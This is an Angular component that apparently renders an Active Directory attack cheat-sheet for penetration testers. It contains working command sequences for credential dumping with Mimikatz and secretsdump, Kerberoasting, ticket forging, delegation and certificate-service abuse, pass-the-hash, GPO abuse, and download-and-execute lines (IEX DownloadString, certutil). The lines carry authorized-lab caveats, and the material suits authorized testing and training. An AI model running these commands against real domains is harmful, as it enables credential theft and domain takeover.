
import { Component, DestroyRef, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MatExpansionModule } from '@angular/material/expansion';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { Terminal } from '../../shared/terminal/terminal';
import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';

@Component({
  selector: 'app-active-directory',
  standalone: true,
  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent, RouterLink],
  templateUrl: './active-directory.html',
  styleUrl: './active-directory.scss',
})
export class ActiveDirectory implements OnInit {

  selectedService: string | null = 'full-ad-compromise-linux';
  readonly sections: SectionIndexItem[] = [
    { id: 'full-ad-compromise-linux', label: 'Kali Single-Host Flow', group: 'AD Flow', important: true },
    { id: 'ad-flow', label: 'Windows Pivot Flow', group: 'AD Flow', important: true },
    { id: 'windows', label: 'Windows Commands', group: 'Enumeration' },
    { id: 'powerview', label: 'PowerView', group: 'Enumeration' },
    { id: 'manual', label: 'Manual Enumeration', group: 'Enumeration' },
    { id: 'spn', label: 'SPN Enumeration', group: 'Enumeration' },
    { id: 'acl', label: 'Object Permissions', group: 'Enumeration' },
    { id: 'shares', label: 'Domain Shares', group: 'Enumeration' },
    { id: 'bloodhound', label: 'BloodHound', group: 'Enumeration' },
    { id: 'credentials', label: 'Credential Access', group: 'Attacking' },
    { id: 'kerberos', label: 'Kerberos Attacks', group: 'Attacking' },
    { id: 'passwords', label: 'Password Attacks', group: 'Attacking' },
    { id: 'adcs', label: 'AD Certificate Services (ADCS)', group: 'Attacking' },
    { id: 'dcom', label: 'DCOM Lateral Movement', group: 'Attacking' },
    { id: 'gpo-abuse', label: 'GPO Abuse', group: 'Attacking' },
    { id: 'post-exploitation-checklist', label: 'Post-Compromise Checklist', group: 'Post-Exploitation' },
    { id: 'compromise', label: 'Domain Compromise', group: 'Attacking' },
    { id: 'ad-example-three-host', label: 'Three-Host Domain Chain', group: 'Examples', important: true },
    { id: 'planned-privesc', label: 'Privilege Escalation', group: 'Coming later', disabled: true }
  ];
  selectedFlowPhase = '';
  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);

  ngOnInit(): void {
    this.route.queryParamMap
      .pipe(takeUntilDestroyed(this.destroyRef))
      .subscribe(params => {
        const service = params.get('service');
        if (service && this.sections.some(item => item.id === service && !item.disabled)) {
          this.selectedService = service;
        }
        this.selectedFlowPhase = params.get('phase') ?? '';
      });
  }

  // =========================================================
  // NAVIGATION
  // =========================================================

  selectService(service: string): void {
    this.selectedService = service;
    void this.router.navigate([], {
      relativeTo: this.route,
      queryParams: { service },
      replaceUrl: true
    });
  }

  clearService(): void {
    this.selectedService = 'full-ad-compromise-linux';
  }

  // =========================================================
  // WINDOWS COMMANDS
  // =========================================================

  windowsUsers = `
# List users in the domain
net user /domain

# Get information about a specific domain user
net user <username> /domain
`;

  windowsGroups = `
# List domain groups
net group /domain

# Enumerate a specific domain group
net group "Sales Department" /domain
`;

  // =========================================================
  // POWERVIEW
  // =========================================================

  powerViewImport = `
# Import PowerView
Import-Module .\\PowerView.ps1

# Get basic domain information
Get-NetDomain
`;

  powerViewUsers = `
# List domain users
Get-NetUser

# Display common names
Get-NetUser | Select-Object cn

# Display password and logon information
Get-NetUser | Select-Object cn,pwdlastset,lastlogon
`;

  powerViewGroups = `
# List domain groups
Get-NetGroup

# Display group names
Get-NetGroup | Select-Object cn

# Enumerate members of a specific group
Get-NetGroup "Sales Department" | Select-Object member
`;

  // =========================================================
  // MANUAL ENUMERATION
  // =========================================================

  manualComputers = `
# Enumerate domain computers
Get-NetComputer

# Identify operating systems and hostnames
Get-NetComputer | Select-Object operatingsystem,dnshostname

# Include operating system versions
Get-NetComputer | Select-Object operatingsystem,dnshostname,operatingsystemversion
`;

  manualLocalAdmin = `
# Find systems where the current user has local admin access
Find-LocalAdminAccess
`;

  manualSessions = `
# Query sessions on a named domain computer such as files04
Get-NetSession -ComputerName <name> -Verbose

# Example: query files04
Get-NetSession -ComputerName files04 -Verbose

# List logged-on users with PsLoggedOn
.\\PsLoggedon.exe \\\\<name>

# Example: query files04
.\\PsLoggedon.exe \\\\files04
`;

  // =========================================================
  // SPN ENUMERATION
  // =========================================================

  spnSetspn = `
# List SPNs registered to a user
setspn -L <user>

# Example: inspect the iis_service account
setspn -L iis_service
`;

  spnPowerView = `
# Find domain users with registered SPNs
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
`;

  spnDns = `
# Perform a reverse DNS lookup
nslookup.exe <IP>
`;

  // =========================================================
  // OBJECT PERMISSIONS / ACLs
  // =========================================================

  aclRights = `
# GenericAll: Full control over the object
# GenericWrite: Modify object attributes
# WriteOwner: Change the object's owner
# WriteDACL: Modify the object's access control list
# AllExtendedRights: Inspect the specific extended rights
# ForceChangePassword: Reset a user's password
# Self: Perform permitted self-membership or attribute changes
`;

  aclEnumeration = `
# Enumerate permissions on a user object
Get-ObjectAcl -Identity <user>

  # Example: inspect the stephanie user object
Get-ObjectAcl -Identity stephanie

# Convert a SID to a name
Convert-SidToName <ObjectSID>
`;

  aclGenericAll = `
# Find GenericAll permissions on a group
Get-ObjectAcl -Identity "Management Department" |
  Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} |
  Select-Object SecurityIdentifier,ActiveDirectoryRights
`;

  aclGroupMembership = `
# Add a user to a domain group
net group "Management Department" stephanie /add /domain

# Verify group membership
Get-NetGroup "Management Department" | Select-Object member

# Remove the user from the group
net group "Management Department" stephanie /delete /domain
`;

  aclAbuseWorkflow = String.raw`# Assess ACL paths identified by BloodHound or Get-ObjectAcl.
# Use only with an explicitly authorized lab account and object.

# GenericAll / ForceChangePassword: reset a test user's password
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set password <TARGET_USER> '<NEW_TEST_PASSWORD>'

# WriteDACL: a principal can grant an additional object right
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dacl "<TARGET_GROUP>" <USER> GenericAll

# WriteOwner: set the owner, then review whether an ACL change is permitted
Set-DomainObjectOwner -Identity <TARGET_OBJECT> -OwnerIdentity <USER>
Add-DomainObjectAcl -TargetIdentity <TARGET_OBJECT> -PrincipalIdentity <USER> -Rights All

# Verify the resulting ACL and group membership, then restore the original
# state when the lab or engagement plan requires cleanup.

# GPO review: identify who can edit/link the policy and which OUs it affects.
# Do not alter production policy or deploy scripts outside the approved scope.
`;

  // =========================================================
  // DOMAIN SHARES
  // =========================================================

  sharesEnumeration = `
# Discover domain shares
Find-DomainShare

# Check which shares are accessible
Find-DomainShare -CheckShareAccess
`;

  sharesAccess = `
# List the contents of a SYSVOL path
Get-ChildItem \\\\dc1.corp.com\\sysvol\\corp.com\\
`;

  sharesGpp = `
# Decrypt a Group Policy Preferences password hash
gpp-decrypt <password>
`;

  // =========================================================
  // BLOODHOUND / SHARPHOUND
  // =========================================================

  bloodhoundOverview = `
# SharpHound collects Active Directory relationship data.
# BloodHound visualizes relationships and potential attack paths.

# Useful analysis goals:
# - Shortest path to Domain Admin
# - Misconfigured object permissions (ACLs)
# - Local administrator relationships
# - Session-based attack paths
# - Kerberoastable and AS-REP roastable users
`;

  sharpHoundDownload = `
# Download and load the PowerShell collector
IEX (New-Object Net.WebClient).DownloadString(
  'http://<IP>/SharpHound.ps1'
)

# Alternative: download the executable using certutil
certutil -urlcache -f http://<IP>/SharpHound.exe SharpHound.exe

# Alternative: download a file using PowerShell
Invoke-WebRequest -Uri http://<IP>/SharpHound.exe \`
  -OutFile SharpHound.exe
`;

  sharpHoundCollection = `
# Collect supported data using SharpHound
.\\SharpHound.exe -c All

# Save the output to a specific directory
.\\SharpHound.exe -c All --outputdirectory C:\\Temp

# Specify the target domain
.\\SharpHound.exe -c All -d resourced.local
`;

  sharpHoundPowerShell = `
# Import the PowerShell collector
Import-Module .\\SharpHound.ps1

# Review available parameters
Get-Help Invoke-BloodHound

# Collect data and specify the output directory
Invoke-BloodHound -CollectionMethod All \`
  -OutputDirectory C:\\Users\\user\\Desktop \`
  -OutputPrefix "domain audit"
`;

  bloodhoundKali = `
# Start the Neo4j database service
sudo neo4j start

# Launch BloodHound
bloodhound
`;

  bloodhoundTransfer = `
# From an Evil-WinRM session, download the collected ZIP
download 20240504120000_BloodHound.zip
`;

  bloodhoundQueries = `
# Useful BloodHound analysis goals

# Shortest Path to Domain Admin
# Find Local Admin Rights
# Find Kerberoastable Users
# Find AS-REP Roastable Users
# Find Sessions (Logged-on Users)
`;


  // =========================================================
  // ATTACKING ACTIVE DIRECTORY
  // =========================================================

  // CREDENTIAL ACCESS

  attackCredentialOverview = `
# Identify the current security context
whoami
whoami /all

# Inspect interactive sessions
query user
qwinsta

# Inspect Kerberos tickets
klist

# Credential-access assessment checklist
# - Current user privileges
# - Local administrator or SYSTEM access
# - Logged-on privileged accounts
# - Accessible credential stores
# - Windows security protections
`;

  attackLsass = `
# Mimikatz: credential material in LSASS
# Use only in an authorized lab with appropriate privileges.

.\\mimikatz.exe

# Within the Mimikatz console
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv
sekurlsa::tickets
sekurlsa::ekeys

# Results depend on Windows protections, logon state
# and the privileges of the current process.
`;

  attackCachedCredentials = `
# In an elevated Mimikatz console, inspect cached domain logons
lsadump::cache

# DCC2 / MS Cache v2 is not an NTLM hash.
# Offline password auditing with Hashcat:
hashcat -m 2100 hashes.txt /path/to/wordlist.txt

# John the Ripper:
john --format=mscash2 hashes.txt
`;

  attackSam = `
# Save local registry hives (requires appropriate privileges)
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM

# Analyze the exported hives on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# SAM contains local account hashes, not all domain hashes.
`;

  attackLsaSecrets = `
# In a Mimikatz console, inspect LSA secrets
lsadump::secrets

# Inspect local SAM hashes in the same console
lsadump::sam

# LSA secrets may contain service-related or machine-account
# material depending on the system configuration.
`;

  attackCredentialManager = `
# Enumerate credentials visible to the current user
cmdkey /list

# Inspect current Kerberos tickets
klist

# Mimikatz commands for an authorized lab
sekurlsa::credman
vault::cred

# Results depend on Windows version, logon session
# and the current security context.
`;

  attackDpapi = `
# In a Mimikatz console, inspect DPAPI material in memory
sekurlsa::dpapi

# DPAPI can protect browser data, application secrets
# and Credential Manager data.
#
# Recovering a master key does not automatically decrypt
# every protected file. Additional key material may be needed.
`;

  attackNtds = `
# Assess domain-controller credential exposure.
# Requires valid authentication and appropriate privileges.

# Remote assessment of a single account
impacket-secretsdump -just-dc-user <username> <domain>/<user>@<dc-ip>

# Use a lab account and the actual domain-controller address.
# Ordinary domain-user credentials are not sufficient by themselves.
`;

  // =========================================================
  // KERBEROS ATTACKS
  // =========================================================

  attackAsrep = String.raw`# AS-REP Roasting: accounts with DONT_REQ_PREAUTH only
# Use only in an authorized lab; offline cracking does not contact the DC.

# Windows: enumerate accounts with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Windows: request hashes with Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Windows: target one known account
Rubeus.exe asreproast /user:<USER> /domain:<DOMAIN> /dc:<DC_FQDN> /nowrap /outfile:asrep.txt

# Kali: request hashes without credentials (requires a username list)
impacket-GetNPUsers <DOMAIN>/ -dc-ip {{TARGET_IP}} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# Kali: request for an authenticated account
impacket-GetNPUsers <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}} -request -format hashcat -outputfile asrep.txt

# Offline audit: Hashcat mode 18200 is Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep.txt /path/to/wordlist.txt
hashcat -m 18200 asrep.txt --show

# Targeted lab demonstration: requires write rights on the user object.
# XOR toggles the flag; run a second time to restore its previous state.
Set-DomainObject -Identity <USER> -XOR @{useraccountcontrol=4194304} -Verbose
`;

  attackKerberoast = String.raw`# Kerberoasting: request TGS material for accounts with SPNs
# Request tickets only within the approved scope; crack them offline.

# Windows: enumerate SPN accounts with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Windows: export hashes from PowerView for offline review
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Windows: collect hashes with Rubeus
Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt
Rubeus.exe kerberoast /user:<USER> /nowrap /outfile:kerberoast.txt

# Kali: request TGS hashes with Impacket and authorized credentials
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}} -request -outputfile kerberoast.txt

# Offline audit: mode 13100 is etype 23; mode 19700 is etype 17; mode 19600 is etype 18
hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt
hashcat -m 13100 kerberoast.txt --show

# Prioritize weak service-account passwords and excessive privileges.
# Ticket encryption depends on the account and domain configuration.
`;

  attackKerbrute = String.raw`# Kerbrute: username enumeration and one-password assessment
# Confirm authorization, lockout policy, scope and attempt limits first.
# Stop on lockout indicators; do not spray production accounts.

# Enumerate candidate usernames against the domain controller
kerbrute userenum users.txt --dc {{TARGET_IP}} -d <DOMAIN>

# Controlled lab only: test one approved password against an approved user list
kerbrute passwordspray users.txt '<APPROVED_LAB_PASSWORD>' --dc {{TARGET_IP}} -d <DOMAIN>

# Review authentication events and lockout status after the test.
`;

  attackDelegation = String.raw`# Delegation assessment: identify configured delegation and its scope
# Validate findings only with approved lab accounts and systems.

# Windows: enumerate unconstrained delegation on computers
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Windows: find users and computers trusted for protocol transition
Get-DomainUser -TrustedToAuth | Select-Object samaccountname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname

# Windows: inspect allowed-to-delegate SPNs
Get-DomainUser -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties dnshostname,msds-allowedtodelegateto

# Unconstrained delegation: monitor only in a disposable lab session
Rubeus.exe monitor /interval:5 /nowrap
# Optional controlled coercion test, only against authorized lab hosts
SpoolSample.exe <DC_FQDN> <LAB_HOST_FQDN>

# Constrained delegation: request a ticket only for an allowed SPN
Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<SERVICE_NTLM_HASH> /impersonateuser:<AUTHORIZED_TEST_USER> /msdsspn:<ALLOWED_SPN> /ptt

# Kali: request a constrained-delegation service ticket with Impacket
impacket-getST -spn <ALLOWED_SPN> -impersonate <AUTHORIZED_TEST_USER> <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}

# Kali: summarize delegation using Impacket
impacket-findDelegation <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}

# User-based unconstrained delegation: lab-only overview
# Requires a delegated test account, approved DNS/SPN changes and a controlled listener.
python dnstool.py -u <DOMAIN>/<USER> -p '<PASSWORD>' -r <LAB_HOST_FQDN> -d {{LOCAL_IP}} --action add {{TARGET_IP}}
python addspn.py -u <DOMAIN>/<USER> -p '<PASSWORD>' --target-type samname -t <DELEGATED_USER> -s CIFS/<LAB_HOST_FQDN> <DC_FQDN>
sudo python krbrelayx.py -hashes :<DELEGATED_USER_NTLM_HASH>

# Trigger only an approved lab authentication and monitor for tickets
Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe <AUTHORIZED_LAB_HOST> <LAB_HOST_FQDN>

# Review delegated SPNs, account privileges and relevant event logs.
# Unconstrained delegation can expose cached tickets; do not export them outside the lab.
`;

  attackRbcd = String.raw`# Resource-Based Constrained Delegation (RBCD)
# Requirement: authorized write rights over the target computer object's RBCD attribute.
# Use a disposable lab account/computer and remove the ACL change after testing.

# Windows: locate computer-object permissions with PowerView/BloodHound
Get-DomainComputer -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity
Get-ObjectAcl -Identity <TARGET_COMPUTER> -ResolveGUIDs

# Kali: add a lab computer account if the domain policy permits it
impacket-addcomputer <DOMAIN>/<USER>:'<PASSWORD>' -computer-name '<LAB_COMPUTER>$' -computer-pass '<LAB_MACHINE_PASSWORD>' -dc-host <DC_FQDN> -dc-ip {{TARGET_IP}}

# Grant the lab computer delegation rights on the target (authorized lab only)
impacket-rbcd -delegate-from '<LAB_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}

# Request a service ticket for a lab service
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate <AUTHORIZED_TEST_USER> <DOMAIN>/'<LAB_COMPUTER>$':'<LAB_MACHINE_PASSWORD>' -dc-ip {{TARGET_IP}}

# Use the ticket only against the authorized lab service
export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>

# Cleanup: remove the delegation entry and disposable computer account
impacket-rbcd -delegate-from '<LAB_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action remove <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}
impacket-addcomputer <DOMAIN>/<USER>:'<PASSWORD>' -computer-name '<LAB_COMPUTER>$' -delete -dc-ip {{TARGET_IP}}
`;

  attackTicketEnumeration = `
# List tickets in the current Windows logon session
klist

# Mimikatz: inspect tickets in LSASS
sekurlsa::tickets

# Rubeus: enumerate ticket metadata
.\\Rubeus.exe triage

# Exporting or accessing tickets requires appropriate access.
# Protect exported .kirbi files as sensitive credentials.
`;

  attackPassTheTicket = `
# Rubeus ticket operations require an authorized lab
# and a valid ticket belonging to the test environment.

# Create an isolated logon session for a controlled test
Rubeus.exe createnetonly /program:cmd.exe /show

# Inspect tickets in the current session
klist
Rubeus.exe triage

# Import a lab ticket into the selected session
.\\Rubeus.exe ptt /ticket:<ticket-file.kirbi>

# Verify the ticket cache and access only the matching authorized service
klist

# Linux: convert a lab .kirbi ticket for Impacket, if needed
impacket-ticketConverter <TICKET_FILE>.kirbi <TICKET_FILE>.ccache
export KRB5CCNAME=./<TICKET_FILE>.ccache
impacket-smbclient -k -no-pass <TARGET_FQDN>

# A ticket does not automatically grant access to every host:
# the service, identity, validity and permissions must match.
`;

  attackGoldenTicket = String.raw`# Golden Ticket: high-impact domain recovery / lab demonstration only
# Requires the KRBTGT key, domain SID and an authorized domain test environment.
# Treat generated tickets and keys as credentials; rotate KRBTGT twice after exposure.

# Windows: forge and inject a lab ticket with Mimikatz
mimikatz.exe
kerberos::golden /domain:<DOMAIN> /user:<AUTHORIZED_TEST_USER> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM_HASH> /ptt

# Kali: create a ticket file with Impacket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <AUTHORIZED_TEST_USER>
export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
impacket-psexec -k -no-pass <DC_FQDN>

# Verify ticket metadata without using it outside the approved scope
klist

# Detection/remediation: audit ticket lifetimes and unusual identities;
# rotate the KRBTGT secret twice with replication convergence between resets.
`;

  attackSilverTicket = String.raw`# Silver Ticket: service-specific ticket validation in an authorized lab
# Requires the service/machine account key, domain SID, target SPN and test identity.
# Unlike a Golden Ticket, scope is limited to the target service.

# Kali: generate a service ticket for a lab SPN
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET_FQDN> <AUTHORIZED_TEST_USER>

# Export the ticket and verify its metadata; use only against the authorized service
export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
klist
impacket-smbclient -k -no-pass <TARGET_FQDN>

# Windows tool alternative: build a test ticket with Mimikatz
mimikatz.exe
kerberos::golden /domain:<DOMAIN> /user:<AUTHORIZED_TEST_USER> /sid:<DOMAIN_SID> /rc4:<SERVICE_NTLM_HASH> /target:<TARGET_FQDN> /service:cifs /ptt

# Detection: correlate service access with DC ticket-request logs and inspect unusual PACs.
# Remediation: rotate the compromised service/machine account secret and review access.
`;

  // =========================================================
  // PASSWORD ATTACKS
  // =========================================================

  attackPasswordPolicy = `
# Inspect domain password and lockout policy
net accounts /domain

# Inspect local account policy
net accounts

# Review:
# - Lockout threshold
# - Lockout duration
# - Observation window
# - Password length and complexity
#
# Confirm the approved testing limits before authentication tests.
`;

  attackCredentialValidation = `
# Resolve the current domain, PDC and base DN for an LDAP test.
# This snippet does not bind or validate credentials.

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = $domainObj.PdcRoleOwner.Name
$dn = "DC=" + $domainObj.Name.Replace(".", ",DC=")
$path = "LDAP://$pdc/$dn"

# Perform any credential bind separately with authorized lab credentials.
# Do not hardcode passwords in scripts or command history.
`;

  attackPasswordSpray = `
# Password spraying tests one approved candidate password
# against a controlled set of test accounts.
#
# Before testing:
# 1. Obtain explicit authorization.
# 2. Review lockout policy and approved attempt limits.
# 3. Use designated lab accounts.
# 4. Monitor authentication logs.
#
# Do not run a spray against an unspecified or production domain.
`;

  attackSmbValidation = `
# Validate a known lab credential against an authorized SMB host
# with NetExec (success does not necessarily mean admin access).

nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>'

# Enumerate shares when authorized
nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>' --shares

# Review authentication status, privileges and share permissions.
`;

  // =========================================================
  // ACTIVE DIRECTORY CERTIFICATE SERVICES
  // =========================================================

  adcsOverview = String.raw`# AD Certificate Services (AD CS) issues certificates used for
# authentication by domain users and computers.
# Misconfigured templates or permissions can expose identity paths.
# Assess only the authorized domain and avoid retaining private keys.

# Review certificate authorities, templates, permissions and findings.
# Prioritize ESC findings only after validating the affected configuration.
`;

  adcsEnumeration = String.raw`# Enumerate certificate authorities and vulnerable templates
certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable

# Review CA name, target server, template name, enrollment rights,
# subject/SAN settings, and template owner/write permissions.
# Common findings to assess include ESC1, ESC2, ESC3, ESC4 and ESC8.
`;

  adcsTemplateReview = String.raw`# ESC4 assessment: a principal may have dangerous rights on a template.
# Save the existing template configuration before any approved lab change.
certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -dc-ip <DC_IP> -save-configuration template-backup.json

# Template modification changes Active Directory configuration.
# Only perform a controlled demonstration when specifically authorized.
certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -dc-ip <DC_IP> -write-default-configuration -force

# Restore the saved configuration after the test using the supported
# Certipy template restore workflow for the installed version.
`;

  adcsCertificateRequest = String.raw`# Request a certificate from the identified CA and template
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <TEMPLATE>

# If the template permits an alternate UPN (for an approved lab test):
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <TEMPLATE> -upn <TEST_USER>@<DOMAIN>

# Modern environments may require a SID extension. Determine the correct
# test account SID before requesting a replacement certificate.
impacket-lookupsid <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -target-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE> -upn <TEST_USER>@<DOMAIN> -sid <TEST_USER_SID>
`;

  adcsCertificateAuth = String.raw`# Authenticate with the certificate produced by an approved lab request
certipy-ad auth -pfx <CERTIFICATE>.pfx -dc-ip <DC_IP>

# Review certificate identity and validity before using the result.
certipy-ad cert -pfx <CERTIFICATE>.pfx

# Troubleshooting: specify -target-ip <DC_IP> for RPC reachability issues;
# if the KDC reports a SID mismatch, request a certificate with the correct SID.
# Treat PFX files, tickets and returned hashes as credentials.
`;

  // =========================================================
  // DOMAIN COMPROMISE
  // =========================================================

  attackDcsyncRequirements = `
# DCSync abuses directory replication permissions.
# It does not require an interactive login to the DC, but
# the account must have the relevant replication rights.

# Review effective permissions for:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes In Filtered Set (where relevant)

# Investigate unexpected principals with replication privileges.
`;

  attackDcsyncDetection = `
# Detection and validation checklist

# - Review directory replication events and domain-controller logs.
# - Investigate replication requests from unusual hosts/accounts.
# - Audit privileged group membership and delegated ACLs.
# - Remove unnecessary replication rights.
# - Rotate exposed credentials and assess krbtgt remediation
#   with the domain administrator.
#
# Event availability depends on audit policy and Windows version.
`;

  attackPostCompromise = `
# Post-assessment checklist

1. Record the account and credential type discovered.
2. Identify the exact privileges and affected systems.
3. Avoid using recovered credentials beyond the approved scope.
4. Protect evidence and redact secrets in reports.
5. Notify the system owner of critical credential exposure.
6. Recommend credential rotation and least-privilege remediation.
7. Remove temporary files and tools according to the engagement plan.
`;

  postExploitSituationalAwareness = `
# Establish the current identity and machine context
whoami /all
hostname
systeminfo
ipconfig /all
route print
echo %USERDOMAIN%
nltest /dsgetdc:<DOMAIN>

# Map domain users, privileged groups and current sessions
net user /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain
query user
qwinsta
klist
`;

  postExploitCredentialRecovery = `
# Remote LSASS collection requires authorized local administrator rights
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M lsassy

# Save local registry hives only from an elevated session
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM

# Analyze collected local hives on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Treat recovered hashes, tickets and passwords as sensitive evidence.
# Do not store credentials in source code or outside the engagement workspace.
`;

  postExploitCredentialRoutes = `
# Password: validate access only against the approved target list
nxc smb <TARGETS> -u <USER> -p '<PASSWORD>' --continue-on-success
nxc winrm <TARGETS> -u <USER> -p '<PASSWORD>'

# NTLM hash: use only where Pass-the-Hash is in scope
nxc smb <TARGETS> -u <USER> -H <NTLM_HASH> --continue-on-success
nxc winrm <TARGETS> -u <USER> -H <NTLM_HASH>

# Remote execution requires sufficient administrative rights
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>

# Kerberos ticket: verify the identity, service and expiry with klist;
# continue with the Kerberos / Pass-the-Ticket section, not password spraying.
`;

  postExploitAdminGroupAccess = `
# Optional: only if explicitly authorized to modify local group membership.
# Run from an elevated Windows session; this changes the target host.
net localgroup Administrators <USER> /add

# Verify the resulting membership
net localgroup Administrators

# From Kali, reconnect using the approved account
evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -p '<PASSWORD>'

# If the approved credential is an NTLM hash instead of a password
evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -H <NTLM_HASH>
`;


  // =========================================================
  // DCOM LATERAL MOVEMENT
  // =========================================================

  attackDcom = String.raw`# DCOM is a remote-execution option, not a privilege-escalation technique.
# Requires authorized credentials, remote DCOM rights and RPC reachability.

# Enumerate DCOM applications and registered COM identifiers
Get-CimInstance Win32_DCOMApplication
Get-ChildItem HKLM:\Software\Classes\AppID
Get-ChildItem HKLM:\Software\Classes\CLSID

# Controlled validation using MMC20.Application on an authorized lab host
$dcom = [System.Activator]::CreateInstance(
  [type]::GetTypeFromProgID("MMC20.Application.1", "<TARGET_HOST>")
)
$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami", "7")

# Method selection depends on target permissions and network policy:
# SMB + local admin -> PsExec; WinRM rights -> WinRM;
# WMI permissions -> WMI; DCOM permissions + RPC -> DCOM.
# Commands execute as the supplied identity; verify the resulting context.
`;

  // =========================================================
  // GPO ABUSE
  // =========================================================

  gpoEnumeration = String.raw`# List every GPO in the domain and who can edit it
Get-DomainGPO | select displayname, gpcfilesyspath

# Resolve which OUs / users / computers a given GPO applies to
Get-DomainOU | Get-DomainGPO -ResolveLinks | select displayname

# Find GPOs the current user can modify (GenericWrite / WriteProperty / WriteDacl)
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | ? {
  $_.SecurityIdentifier -match $(ConvertTo-SID '<CURRENT_USER>')
}

# BloodHound: look for "WriteGPLink" / "GPLink" / GenericAll on OU edges
# and for Users/Computers in scope of a modifiable GPO
`;

  gpoAbuseSharpGpo = String.raw`# SharpGPOAbuse adds a malicious computer/user startup task to a GPO the
# compromised principal can already edit, then forces policy refresh.

SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" \
  --Author <DOMAIN>\<USER> \
  --Command "cmd.exe" \
  --Arguments "/c net localgroup administrators <DOMAIN>\\<USER> /add" \
  --GPOName "<TARGET_GPO_NAME>"

# On the target (or wait for the ~90-120 min default refresh interval)
gpupdate /force

# Verify the new local administrator on an affected computer
net localgroup administrators
`;

  gpoImmediateTask = String.raw`# Alternative: push a GPO "Immediate Task" via PowerView when SharpGPOAbuse
# is not available (requires GenericWrite/WriteProperty on the GPO object)

New-GPOImmediateTask -TaskName "Updater" -Command "cmd.exe" \
  -CommandArguments "/c net localgroup administrators <DOMAIN>\\<USER> /add" \
  -GPOname "<TARGET_GPO_NAME>" -Force

# Always confirm GPO scope (linked OU, enforced/blocked inheritance,
# WMI/security filtering) before relying on this to affect a specific host
gpresult /r
`;

  // =========================================================
